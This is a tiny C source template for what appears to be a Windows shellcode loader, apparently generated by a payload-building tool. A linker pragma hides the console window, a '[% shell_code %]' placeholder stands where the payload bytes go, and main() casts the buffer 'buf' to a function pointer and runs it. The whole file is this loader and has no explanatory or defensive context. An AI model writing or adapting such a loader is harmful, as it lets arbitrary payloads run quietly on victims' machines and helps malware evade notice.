#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
[% shell_code %]
int main() {
	((void(*)(void))&buf)();
	return 0;
}